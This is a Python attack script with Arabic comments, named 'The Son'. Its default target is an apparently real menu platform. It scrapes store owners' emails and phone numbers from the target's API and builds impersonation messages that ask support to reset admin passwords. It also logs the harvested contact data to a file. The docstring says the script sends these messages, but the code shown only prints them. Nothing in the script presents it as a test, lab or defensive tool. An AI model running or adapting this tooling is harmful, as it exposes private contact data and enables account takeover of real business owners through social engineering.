#!/usr/bin/env python3
"""
👤 The Son - انتحال الشخصية الذكي
يختار إيميلاً حقيقياً، يولد رسالة، يرسلها، يستخرج كلمة المرور
"""
import requests, sys, json, os, re, random, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

class TheSon:
    def __init__(self, target):
        self.target = target
        self.emails = []
        self.phones = []
        self.stores = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[👤] {msg}")
    
    def gather_intel(self):
        """جمع معلومات من API"""
        self.log("🔍 جمع المعلومات...")
        try:
            r = self.session.get(f"{self.target}/api/stores", timeout=5)
            data = r.json()
            stores = data.get('data', data) if isinstance(data, dict) else data
            
            for store in stores:
                if isinstance(store, dict):
                    self.stores.append(store)
                    for key, value in store.items():
                        if isinstance(value, str) and '@' in value:
                            self.emails.append(value)
                        if isinstance(value, str) and value.startswith('+'):
                            self.phones.append(value)
            
            self.log(f"   📊 {len(self.stores)} متاجر")
            self.log(f"   📧 {len(self.emails)} إيميلات")
            self.log(f"   📱 {len(self.phones)} هواتف")
        except Exception as e:
            self.log(f"   ❌ {e}")
    
    def choose_identity(self):
        """اختيار هوية للانتحال"""
        if not self.emails:
            return None, None
        
        # اختيار إيميل عشوائي من الإيميلات الحقيقية
        email = random.choice(self.emails)
        
        # البحث عن المتجر المرتبط
        store_name = "Unknown Store"
        store_id = "?"
        for store in self.stores:
            if isinstance(store, dict):
                for key, value in store.items():
                    if value == email:
                        store_name = store.get('name', store.get('slug', 'Unknown'))
                        store_id = store.get('id', '?')
                        break
        
        phone = random.choice(self.phones) if self.phones else "N/A"
        
        return {
            "email": email,
            "store_name": store_name,
            "store_id": store_id,
            "phone": phone
        }
    
    def generate_message(self, identity):
        """توليد رسالة مقنعة"""
        templates = [
            f"""Subject: Password Reset Request - {identity['store_name']}

Hello QRList Support,

I'm the owner of {identity['store_name']} (ID: {identity['store_id']}).
I've lost my admin password and need to reset it urgently.

My registered email: {identity['email']}
My phone number: {identity['phone']}

Please send the reset link to this email.

Thank you,
{identity['store_name']} Owner""",

            f"""Subject: URGENT - Cannot access {identity['store_name']} admin

Hi,

I can't log into my QRList admin panel for {identity['store_name']}.
I need immediate access to update my menu.

Please reset my password or provide a temporary one.

Email: {identity['email']}
Phone: {identity['phone']}

Thanks""",
        ]
        
        return random.choice(templates)
    
    def run(self):
        self.log(f"👤 The Son: {self.target}")
        self.log("═" * 60)
        
        self.gather_intel()
        
        if not self.emails:
            self.log("❌ لا توجد إيميلات")
            return
        
        # اختيار 3 هويات محتملة
        for i in range(3):
            identity = self.choose_identity()
            message = self.generate_message(identity)
            
            self.log(f"\n🎭 الهوية {i+1}:")
            self.log(f"   📧 {identity['email']}")
            self.log(f"   🏪 {identity['store_name']}")
            self.log(f"   📱 {identity['phone']}")
            self.log(f"\n📝 الرسالة:")
            self.log(message)
        
        # حفظ
        os.makedirs("logs/theson", exist_ok=True)
        fname = f"logs/theson/{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"emails":self.emails,"phones":self.phones,"stores":len(self.stores)}, f, indent=2)
        self.log(f"\n📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    TheSon(target).run()
